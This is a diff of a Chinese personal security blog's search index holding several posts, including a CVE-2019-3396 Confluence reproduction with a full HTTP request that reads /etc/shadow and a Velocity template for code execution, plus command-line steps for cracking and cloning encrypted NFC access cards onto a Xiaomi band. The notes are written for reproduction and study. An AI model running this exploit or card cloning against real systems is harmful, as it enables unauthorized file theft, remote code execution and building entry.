@@ -1,139 +1,60 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>CVE-2019-3396：confluence任意文件读取与RCE漏洞复现</title>
-      <link href="/2019/04/08/CVE-2019-3396%EF%BC%9Aconfluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-      <url>/2019/04/08/CVE-2019-3396%EF%BC%9Aconfluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-      
-        <content type="html"><![CDATA[<h1 id="CVE-2019-3396的相关情报"><a href="#CVE-2019-3396的相关情报" class="headerlink" title="CVE-2019-3396的相关情报"></a>CVE-2019-3396的相关情报</h1><p>详细的漏洞解析参考<a href="https://chybeta.github.io/2019/04/06/Analysis-for-%E3%80%90CVE-2019-3396%E3%80%91-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/" title="cve-2019-3396" target="_blank" rel="noopener">cve-2019-3396</a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>构造请求<br>    POST /rest/tinymce/1/macro/preview HTTP/1.1<br>    Host: confluence.xxxxxx.com<br>    Pragma: no-cache<br>    Cache-Control: no-cache<br>    Accept: text/html, <em>/</em>; q=0.01<br>    X-Requested-With: XMLHttpRequest<br>    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36<br>    Referer: <a href="http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515" target="_blank" rel="noopener">http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515</a><br>    Accept-Encoding: gzip, deflate<br>    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7<br>    Cookie: xxxxxxx<br>    Content-Type: application/json;charset=utf-8<br>    X-Requested-With: XMLHttpRequest<br>    Connection: close<br>    Content-Length: 176</p><pre><code>{&quot;contentId&quot;:&quot;655594&quot;,&quot;macro&quot;:{&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:{&quot;url&quot;:&quot;https://dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;file:///etc/shadow”}}}</code></pre><p>通过template参数中使用file协议可以读取服务器上的任意文件</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面：</p><pre><code>#set($e=&quot;e&quot;)$e.getClass().forName(&apos;java.lang.System&apos;).getMethod(&apos;getProperty&apos;, $e.getClass().forName(&apos;java.lang.String&apos;)).invoke(null, &apos;os.name&apos;).toString()</code></pre><p>随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE</p>]]></content>
-      
-      
+<search>
+  <entry>
+    <title><![CDATA[CVE-2019-3396：confluence任意文件读取与RCE漏洞复现]]></title>
+    <url>%2F2019%2F04%2F08%2FCVE-2019-3396%EF%BC%9Aconfluence%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
+    <content type="text"><![CDATA[CVE-2019-3396的相关情报详细的漏洞解析参考cve-2019-3396 漏洞利用文件读取构造请求 POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: confluence.xxxxxx.com Pragma: no-cache Cache-Control: no-cache Accept: text/html, /; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36 Referer: http://confluence.xxxxx.com/pages/editpage.action?pageId=32093515 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: xxxxxxx Content-Type: application/json;charset=utf-8 X-Requested-With: XMLHttpRequest Connection: close Content-Length: 176 {&quot;contentId&quot;:&quot;655594&quot;,&quot;macro&quot;:{&quot;name&quot;:&quot;widget&quot;,&quot;body&quot;:&quot;&quot;,&quot;params&quot;:{&quot;url&quot;:&quot;https://dailymotion.com/video/xcpa64&quot;,&quot;width&quot;:&quot;300&quot;,&quot;height&quot;:&quot;200&quot;,&quot;_template&quot;:&quot;file:///etc/shadow”}}} 通过template参数中使用file协议可以读取服务器上的任意文件 RCE由于confluence使用的是velocity模版引擎，而这个任意文件读取本身是通过渲染模版文件来读取的，因此如果模板文件里调用java对象是会被渲染执行的，具体参考下面： #set($e=&quot;e&quot;) $e.getClass().forName(&apos;java.lang.System&apos;).getMethod(&apos;getProperty&apos;, $e.getClass().forName(&apos;java.lang.String&apos;)).invoke(null, &apos;os.name&apos;).toString() 随意上传或者远端存储一个该内容的vm文件，然后通过上述的文件包含漏洞去包含这个模板文件即可导致RCE]]></content>
       <categories>
-          
-          <category> web安全 </category>
-          
+        <category>web安全</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> web安全 </tag>
-            
-            <tag> 漏洞复现 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/2019/04/08/%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9B%B8%E5%85%B3/"/>
-      <url>/2019/04/08/%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9B%B8%E5%85%B3/</url>
-      
-        <content type="html"><![CDATA[<hr><p>title: 安卓模拟器相关<br>date: 2019-04-08 17:43:21<br>tags:</p><ul><li>Android</li><li>黑灰产薅羊毛</li></ul><p>categories: </p><ul><li>移动安全攻防</li></ul><hr><p>#安卓模拟器杂七杂八的记录</p><h2 id="adb常规操作"><a href="#adb常规操作" class="headerlink" title="adb常规操作"></a>adb常规操作</h2><p>可以参考mumu模拟器官方的文档，蛮详细的<a href="http://mumu.163.com/help/func/20190129/30131_797867.html" title="adb常规操作" target="_blank" rel="noopener">adb常规操作</a></p><h2 id="mumu模拟器"><a href="#mumu模拟器" class="headerlink" title="mumu模拟器"></a>mumu模拟器</h2><h2 id="夜神模拟器"><a href="#夜神模拟器" class="headerlink" title="夜神模拟器"></a>夜神模拟器</h2>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>MITMPROXY的摘要</title>
-      <link href="/2019/04/03/MITMPROXY%E7%9A%84%E6%91%98%E8%A6%81/"/>
-      <url>/2019/04/03/MITMPROXY%E7%9A%84%E6%91%98%E8%A6%81/</url>
-      
-        <content type="html"><![CDATA[<h1 id="MITMPROXY基本介绍"><a href="#MITMPROXY基本介绍" class="headerlink" title="MITMPROXY基本介绍"></a>MITMPROXY基本介绍</h1><p>没什么好介绍的，用过burpsuite的理解这个应该没什么难度，就是个httpproxy。主要特色是有命令行工具可以操作抓包，同时可以通过自定义python脚本来集成一些批量化请求和响应的操作比较方便。主要有mitmproxy、mitmdump、mitmweb</p><h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>Mitmproxy很简单，就是个命令行的bursuite，命令行界面操作起来有点像vim，操作的时候更多是对请求进行重新编辑后重放来实现。其他和burp类似的功能，记录各种请求和响应信息。</p><ul><li>貌似支持一个叫做key binding的功能，应该是类似于自定义快捷键和宏操作差不多的意思，主要是在它的终端中使用的。</li><li>支持通过正则配置替换规则来对内容进行替换</li><li>支持过滤，过滤语法参考<a href="https://docs.mitmproxy.org/stable/concepts-filters/" title="mitmproxy filter" target="_blank" rel="noopener">mitmproxy filter</a></li><li>似乎支持TCP代理，但是不能对TCP流进行修改</li><li>支持websocket</li><li>支持socks proxy</li><li>支持透明模式，透明模式是指在网络层进行端口重定向到proxy上，不过不能绕过证书校验（配合ssltrip进行降级可能可行）具体参考<a href="https://docs.mitmproxy.org/stable/howto-transparent/" title="mitmproxy透明模式" target="_blank" rel="noopener">mitmproxy透明模式</a><h2 id="mitmdump"><a href="#mitmdump" class="headerlink" title="mitmdump"></a>mitmdump</h2>Mitmdump与proxy不同的地方在于它可以把请求响应dump出来，并且可以通过自定义的python脚本来实现规则，通过mitmdump -s xxx.py来实现。<br>关于脚本编写的一些案例可以参考<a href="https://docs.mitmproxy.org/stable/addons-scripting/" title="mitmproxy-scripting" target="_blank" rel="noopener">mitmproxy-scripting</a><h2 id="mitmweb"><a href="#mitmweb" class="headerlink" title="mitmweb"></a>mitmweb</h2>mitmproxy的web版本<br>没有更多想说的</li></ul><h1 id="其他重点记录"><a href="#其他重点记录" class="headerlink" title="其他重点记录"></a>其他重点记录</h1><p>暂无</p>]]></content>
-      
-      
+      <tags>
+        <tag>web安全</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2F2019%2F04%2F08%2F%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%9B%B8%E5%85%B3%2F</url>
+    <content type="text"><![CDATA[title: 安卓模拟器相关date: 2019-04-08 17:43:21tags: Android 黑灰产薅羊毛 categories: 移动安全攻防 #安卓模拟器杂七杂八的记录 adb常规操作可以参考mumu模拟器官方的文档，蛮详细的adb常规操作 mumu模拟器夜神模拟器]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[MITMPROXY的摘要]]></title>
+    <url>%2F2019%2F04%2F03%2FMITMPROXY%E7%9A%84%E6%91%98%E8%A6%81%2F</url>
+    <content type="text"><![CDATA[MITMPROXY基本介绍没什么好介绍的，用过burpsuite的理解这个应该没什么难度，就是个httpproxy。主要特色是有命令行工具可以操作抓包，同时可以通过自定义python脚本来集成一些批量化请求和响应的操作比较方便。主要有mitmproxy、mitmdump、mitmweb mitmproxyMitmproxy很简单，就是个命令行的bursuite，命令行界面操作起来有点像vim，操作的时候更多是对请求进行重新编辑后重放来实现。其他和burp类似的功能，记录各种请求和响应信息。 貌似支持一个叫做key binding的功能，应该是类似于自定义快捷键和宏操作差不多的意思，主要是在它的终端中使用的。 支持通过正则配置替换规则来对内容进行替换 支持过滤，过滤语法参考mitmproxy filter 似乎支持TCP代理，但是不能对TCP流进行修改 支持websocket 支持socks proxy 支持透明模式，透明模式是指在网络层进行端口重定向到proxy上，不过不能绕过证书校验（配合ssltrip进行降级可能可行）具体参考mitmproxy透明模式mitmdumpMitmdump与proxy不同的地方在于它可以把请求响应dump出来，并且可以通过自定义的python脚本来实现规则，通过mitmdump -s xxx.py来实现。关于脚本编写的一些案例可以参考mitmproxy-scriptingmitmwebmitmproxy的web版本没有更多想说的 其他重点记录暂无]]></content>
       <categories>
-          
-          <category> 爬虫 </category>
-          
+        <category>爬虫</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> http抓包 </tag>
-            
-            <tag> MITMPROXY </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>小米手环刷公司门禁</title>
-      <link href="/2019/04/02/%E5%B0%8F%E7%B1%B3%E6%89%8B%E7%8E%AF%E5%88%B7%E5%85%AC%E5%8F%B8%E9%97%A8%E7%A6%81/"/>
-      <url>/2019/04/02/%E5%B0%8F%E7%B1%B3%E6%89%8B%E7%8E%AF%E5%88%B7%E5%85%AC%E5%8F%B8%E9%97%A8%E7%A6%81/</url>
-      
-        <content type="html"><![CDATA[<p>主要参考的这篇文章<a href="http://bbs.xiaomi.cn/t-34469927" title="小米手环刷门禁" target="_blank" rel="noopener">PN532全加密门禁卡模拟成功</a></p><h2 id="记一下破解密码的相关命令"><a href="#记一下破解密码的相关命令" class="headerlink" title="记一下破解密码的相关命令"></a>记一下破解密码的相关命令</h2><ol><li>mfcuk -C -R 0:A -s 250 -S 250    #该命令貌似是破解密钥但是我没成功过，它在链接我的NFC设备的时候总报错</li><li>mfoc -O test.dmp      #该命令是可以把内容整个dump出来并且可以破解key的</li><li>nfc-list    #该命令是libnfc中带着的命令，可以列出UID</li><li>nfc-mfsetuid xxxxxx     #该命令也是libnfc中用来设置UID的命令</li><li>nfc-mfclassic w a test.dmp #该命令是用来将数据整个写入到卡里，我理解上是直接复制卡内容，但是好像是有限制的，我在复制的时候也不确定有没有成功。<h3 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h3>小米手环模拟卡片后不知道为什么使用mfoc -O xxx.dmp不能dump里面的数据，但基本可以确定数据已经复制进去了。不过后来我发现虽然那些门禁卡都是加密卡，但是起作用的只是UID，所以一定程度上我们只需要复制UID就可以了。<h2 id="复制UID"><a href="#复制UID" class="headerlink" title="复制UID"></a>复制UID</h2>复制UID的流程就很简单了：</li><li>将需要复制的卡放到读卡器上使用nfc-list读书UID并记录</li><li>将空白卡放到读卡器上使用nfc-mfsetuid设置上面的UID</li><li>小米手环复制非加密卡功能来复制空白卡即可（因为小米限制了复制加密卡）<h2 id="复制加密内容"><a href="#复制加密内容" class="headerlink" title="复制加密内容"></a>复制加密内容</h2>经过测试部分门禁还是会校验加密内容，如果测试过只复制UID无效情况下，可以尝试下面的方法把加密内容一起复制进去，虽然手环在命令读取下没有数据返回但是通过测试发现应该还是有写入成功的。</li><li>mfoc -O test.dmp #来复制卡片内容同时会破解卡片</li><li>先通过复制UID的过程让小米手环模拟白卡</li><li>修改test.dmp文件中，将除了有数据的64blok保留其他都删掉</li><li>按照文章中所示修改对应行的数据</li><li>nfc-mfclassic w a test.dmp #将文件内的数据写入到卡片里<h3 id="PS：-1"><a href="#PS：-1" class="headerlink" title="PS："></a>PS：</h3>读卡器可能会因为驱动问题写入失败，多试几次确保写入成功。</li></ol>]]></content>
-      
-      
+      <tags>
+        <tag>http抓包</tag>
+        <tag>MITMPROXY</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[小米手环刷公司门禁]]></title>
+    <url>%2F2019%2F04%2F02%2F%E5%B0%8F%E7%B1%B3%E6%89%8B%E7%8E%AF%E5%88%B7%E5%85%AC%E5%8F%B8%E9%97%A8%E7%A6%81%2F</url>
+    <content type="text"><![CDATA[主要参考的这篇文章PN532全加密门禁卡模拟成功 记一下破解密码的相关命令 mfcuk -C -R 0:A -s 250 -S 250 #该命令貌似是破解密钥但是我没成功过，它在链接我的NFC设备的时候总报错 mfoc -O test.dmp #该命令是可以把内容整个dump出来并且可以破解key的 nfc-list #该命令是libnfc中带着的命令，可以列出UID nfc-mfsetuid xxxxxx #该命令也是libnfc中用来设置UID的命令 nfc-mfclassic w a test.dmp #该命令是用来将数据整个写入到卡里，我理解上是直接复制卡内容，但是好像是有限制的，我在复制的时候也不确定有没有成功。PS：小米手环模拟卡片后不知道为什么使用mfoc -O xxx.dmp不能dump里面的数据，但基本可以确定数据已经复制进去了。不过后来我发现虽然那些门禁卡都是加密卡，但是起作用的只是UID，所以一定程度上我们只需要复制UID就可以了。复制UID复制UID的流程就很简单了： 将需要复制的卡放到读卡器上使用nfc-list读书UID并记录 将空白卡放到读卡器上使用nfc-mfsetuid设置上面的UID 小米手环复制非加密卡功能来复制空白卡即可（因为小米限制了复制加密卡）复制加密内容经过测试部分门禁还是会校验加密内容，如果测试过只复制UID无效情况下，可以尝试下面的方法把加密内容一起复制进去，虽然手环在命令读取下没有数据返回但是通过测试发现应该还是有写入成功的。 mfoc -O test.dmp #来复制卡片内容同时会破解卡片 先通过复制UID的过程让小米手环模拟白卡 修改test.dmp文件中，将除了有数据的64blok保留其他都删掉 按照文章中所示修改对应行的数据 nfc-mfclassic w a test.dmp #将文件内的数据写入到卡片里PS：读卡器可能会因为驱动问题写入失败，多试几次确保写入成功。]]></content>
       <categories>
-          
-          <category> 物联网 </category>
-          
+        <category>物联网</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 极客 </tag>
-            
-            <tag> 物联网 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>关于淘宝二维码问题的一些想法</title>
-      <link href="/2019/03/29/%E5%85%B3%E4%BA%8E%E6%B7%98%E5%AE%9D%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/"/>
-      <url>/2019/03/29/%E5%85%B3%E4%BA%8E%E6%B7%98%E5%AE%9D%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/</url>
-      
-        <content type="html"><![CDATA[<p>今天fb上发了一篇关于淘宝二维码钓鱼的文章，不过该文章估计也快被公关了，暂时甩个还能访问的链接<a href="http://www.sohu.com/a/304529557_354899" title="淘宝二维码钓鱼问题" target="_blank" rel="noopener">淘宝二维码钓鱼问题原文</a></p><h2 id="大致描述"><a href="#大致描述" class="headerlink" title="大致描述"></a>大致描述</h2><p>总结下来大概的意思就是如何利用淘口令结合网页扫码登录来进行钓鱼。<br>流程为：使用后端服务自动提取登录二维码的链接->转换成淘口令->散布淘口令->用户复制淘口令后进入淘宝APP->淘宝APP内部转换淘口令后跳转登录授权->用户受骗点击登录->后端服务获取到用户的授权即可登录淘宝。</p><h2 id="问题反思"><a href="#问题反思" class="headerlink" title="问题反思"></a>问题反思</h2><p>一开始看的时候很容易让人以为出问题的是二维码扫描登录，其实并不完全是，因为这本身是一个钓鱼的场景，无论我们如何优化二维码扫描登录也无法避免被用来钓鱼。而让这个场景变得更容易被钓鱼的本身原因应该有下面那么几个：</p><ol><li>淘口令生成时候对链接校验不足，本质上还是一个短链接生成服务，虽然有对域名进行校验但是使用URL跳转漏洞可以绕过，那么对于淘口令生成的方面需要加强业务场景的校验，非业务场景的链接应该不予生成。</li><li>淘口令在淘宝APP里打开时候没有做严格的场景限定，应该在APP内限制淘口令仅能用来唤起相应的商品或者店铺，而不是跳转到授权登录页。</li><li>扫码登录的链接应该只能通过淘宝APP扫码来实现，非该操作都不能通过APP内部逻辑来唤醒，本质上还是对于场景的校验不足。</li></ol><p>我个人认为应该按照这么个逻辑来修复这个问题，本质上还是对于钓鱼的场景进行限制即可。没有必要修改二维码扫码登录的协议，最多就是看看还有没有什么加固的空间。<br>当然换句话说，除了淘口令可能被利用以外，如果没有在APP内对于链接唤醒协议的场景做限制，可能还有其他类似的功能也可以被用来做钓鱼。</p>]]></content>
-      
-      
+      <tags>
+        <tag>极客</tag>
+        <tag>物联网</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[关于淘宝二维码问题的一些想法]]></title>
+    <url>%2F2019%2F03%2F29%2F%E5%85%B3%E4%BA%8E%E6%B7%98%E5%AE%9D%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%97%AE%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[今天fb上发了一篇关于淘宝二维码钓鱼的文章，不过该文章估计也快被公关了，暂时甩个还能访问的链接淘宝二维码钓鱼问题原文 大致描述总结下来大概的意思就是如何利用淘口令结合网页扫码登录来进行钓鱼。流程为：使用后端服务自动提取登录二维码的链接->转换成淘口令->散布淘口令->用户复制淘口令后进入淘宝APP->淘宝APP内部转换淘口令后跳转登录授权->用户受骗点击登录->后端服务获取到用户的授权即可登录淘宝。 问题反思一开始看的时候很容易让人以为出问题的是二维码扫描登录，其实并不完全是，因为这本身是一个钓鱼的场景，无论我们如何优化二维码扫描登录也无法避免被用来钓鱼。而让这个场景变得更容易被钓鱼的本身原因应该有下面那么几个： 淘口令生成时候对链接校验不足，本质上还是一个短链接生成服务，虽然有对域名进行校验但是使用URL跳转漏洞可以绕过，那么对于淘口令生成的方面需要加强业务场景的校验，非业务场景的链接应该不予生成。 淘口令在淘宝APP里打开时候没有做严格的场景限定，应该在APP内限制淘口令仅能用来唤起相应的商品或者店铺，而不是跳转到授权登录页。 扫码登录的链接应该只能通过淘宝APP扫码来实现，非该操作都不能通过APP内部逻辑来唤醒，本质上还是对于场景的校验不足。 我个人认为应该按照这么个逻辑来修复这个问题，本质上还是对于钓鱼的场景进行限制即可。没有必要修改二维码扫码登录的协议，最多就是看看还有没有什么加固的空间。当然换句话说，除了淘口令可能被利用以外，如果没有在APP内对于链接唤醒协议的场景做限制，可能还有其他类似的功能也可以被用来做钓鱼。]]></content>
       <categories>
-          
-          <category> 案例记录与反思 </category>
-          
+        <category>案例记录与反思</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 钓鱼 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2019/03/27/hello-world/"/>
-      <url>/2019/03/27/hello-world/</url>
-      
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-  
-  
+      <tags>
+        <tag>钓鱼</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <url>%2F2019%2F03%2F27%2Fhello-world%2F</url>
+    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
+  </entry>
 </search>
